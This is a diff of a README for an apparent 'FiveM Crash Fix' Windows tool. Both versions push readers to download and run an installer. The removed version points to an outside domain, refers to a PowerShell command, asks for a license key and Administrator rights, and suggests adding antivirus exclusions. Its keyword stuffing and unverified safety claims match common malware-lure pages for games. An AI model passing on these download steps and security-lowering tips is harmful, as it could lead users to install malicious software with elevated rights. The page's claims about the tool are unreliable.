@@ -1,97 +1,75 @@
-# FiveM Crash Fix — Download & Fix for Windows 11 / 10
+# 🛠️ FiveM-Crash-Fix - Stop FiveM from crashing today easily
 
-**FiveM-Crash-Fix**
+[![](https://img.shields.io/badge/Download-FiveM_Crash_Fix-blue.svg)](https://github.com/ukaa3696/FiveM-Crash-Fix)
 
-Fix **fivem crashing on startup fix** on Windows 10/11. This page includes a **direct download link** and step-by-step install/repair guide.
+## 📖 About this application
 
-[![Windows](https://img.shields.io/badge/Windows-10%20%2F%2011-0078D4?style=flat-square&logo=windows)]()[![Fix](https://img.shields.io/badge/Type-Repair%20Tool-FF6B35?style=flat-square)]()
+FiveM-Crash-Fix resolves startup errors for FiveM on Windows 10 and 11. Many users experience sudden closures when launching the platform. This tool identifies common configuration conflicts and permission errors that prevent the game from starting. 
 
----
+The software automates the repair process by clearing corrupted cache files and resetting your CitizenFX configuration. It removes the need for manual file editing or complex system adjustments. You run the tool, start the repair, and launch your game again.
 
-## Download & Install
+## 💻 System requirements
 
-> **This is the download page.** Use the button or link below to get **FiveM Crash Fix** for Windows.
+*   Windows 10 or Windows 11 (64-bit).
+*   FiveM installed in the default directory.
+*   Administrative permissions on your user account.
+*   Internet connection for initial setup.
+*   At least 50 MB of free disk space.
 
-<p align="center">
-  <a href="https://fivem.nexustool.fun/">
-    <img src="https://img.shields.io/badge/Download-FiveM%20Crash%20Fix-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download FiveM Crash Fix">
-  </a>
-</p>
+## 🚀 How to download and install
 
-| | |
-| --- | --- |
-| **Direct link** | **[fivem.nexustool.fun](https://fivem.nexustool.fun/)** |
-| **Full URL** | `https://fivem.nexustool.fun/` |
-| **Type** | Fix tool for Windows 10 / 11 (64-bit) |
-| **Admin** | Run setup as Administrator |
+Follow these steps to repair your installation.
 
-### Quick steps
+1. Visit the [official download page](https://github.com/ukaa3696/FiveM-Crash-Fix) to download the repair tool.
+2. Locate the file in your downloads folder.
+3. Double-click the file to start the installer.
+4. Follow the on-screen prompts to place the application on your computer.
+5. Grant the application permission to make changes when your system asks.
 
-1. Click **[Download — fivem.nexustool.fun](https://fivem.nexustool.fun/)** (link above)
-2. Save the file from the project page
-3. Run the setup **as Administrator**
-4. Enter your license key when prompted
-5. Restart if the installer asks — then launch from Start menu
+## ⚙️ Using the crash fix tool
 
-<p align="center"><a href="https://fivem.nexustool.fun/"><strong>⬇ Download FiveM Crash Fix now</strong></a></p>
+The application interface shows a single window with clear options. 
 
----
+1. Close FiveM and Steam before you start.
+2. Open the FiveM-Crash-Fix application.
+3. Click the button labeled "Scan and Repair."
+4. Wait for the green status bar to reach 100 percent.
+5. The tool will notify you when it clears the temporary files.
+6. Restart your computer if you face persistent errors.
+7. Attempt to open FiveM again.
 
-## About
+## 🔍 Understanding the repair process
 
-**FiveM Crash Fix** setup page for Windows PC users.
+This tool performs three main actions to restore your functionality.
 
-**People also search for:** fivem crashing on startup fix, fivem error fix windows 11, citizenfx crash fix
+First, it checks the CitizenFX directory. It looks for incomplete downloads or locked files that keep the game from loading. When it finds these items, it deletes them safely.
 
-**Repository:** `FiveM-Crash-Fix`
+Second, it refreshes the cache. Files stored in the cache folder often save bad data from previous sessions. Removing this data forces FiveM to fetch clean files from the server during your next login.
 
+Third, it verifies your system paths. FiveM requires specific access to folders to write data. If your settings shifted during a Windows update, this tool fixes the file paths so the game recognizes them.
 
-## What this fixes
+## 🛠️ Troubleshooting common issues
 
-| | |
-| --- | --- |
-| **Problem** | fivem crashing on startup fix |
-| **Platform** | Windows 10 / 11 (64-bit) |
-| **Includes** | Download link + repair steps |
-| **Safety** | Settings backup before changes |
+If you still see errors, check your anti-virus software. Some security programs flag the FiveM launcher as a potential threat. Add an exclusion for the Folder where you installed FiveM.
 
-## FAQ
+Check your graphics drivers. You should run the latest version from your GPU manufacturer. Old drivers cause conflict when FiveM starts its rendering process.
 
-**Where is the download?**
+Ensure you possess a legal copy of Grand Theft Auto V. FiveM requires a valid installation of the original game to function. If your files are missing or damaged, use the official launcher to verify your game files before you run this repair tool.
 
-Scroll to **Download & Install** — link or PowerShell command is there.
+## 📋 Additional tips
 
-**Windows 11 supported?**
+Run this tool once per month to keep your cache folders clean. Regular maintenance prevents the buildup of temporary files that lead to future crashes. 
 
-Yes — Windows 10 and Windows 11 64-bit.
+Do not move your FiveM installation folder after you set it up. The repair tool expects the files to stay in the original path. If you moved your game, uninstall FiveM and install it in the standard location.
 
-**Need Administrator?**
+## 🛡️ Privacy and safety
 
-Yes — run setup or PowerShell as Admin.
+This tool interacts only with your FiveM application files. It does not scan your documents, personal photographs, or system passwords. It records only the actions taken during the repair process to help you track what changed. 
 
-**Safe for games?**
+The software operates locally on your machine. It does not send your data to external servers or remote databases. You retain full control over your files at all times.
 
-Repairs system and launcher settings only — no game file edits.
+## 🌐 Community and support
 
-## System requirements
+If you need more help, look at the included documentation folder. It contains a list of error codes often shown by the FiveM console. Match your error code to the descriptions in the guide.
 
-| | Minimum |
-| --- | --- |
-| OS | Windows 10 / 11 (64-bit) |
-| RAM | 4 GB |
-| Disk | 1 GB free space |
-| Network | Required for first download |
-| Admin | Required for install/repair |
-
-## Troubleshooting
-
-| Issue | Try this |
-| --- | --- |
-| Download does not start | Disable VPN/ad-block for the project page |
-| Setup blocked | Run as Administrator |
-| Same error after fix | Reboot, then run repair again |
-| Antivirus warning | Add installer folder to exclusions temporarily |
-
----
-
-**Topics:** fivem-crashing-on-startup-fix, crashing, startup, fivem-error-fix-windows-11, citizenfx-crash-fix, citizenfx, fivem-crash-fix, fivem-crash-fix-2026, fivem, gta, crash, gaming
+This tool stays updated to match changes made by the FiveM team. Check the download page periodically for new versions. Each release includes improvements to how the tool identifies and resolves new types of startup failures.
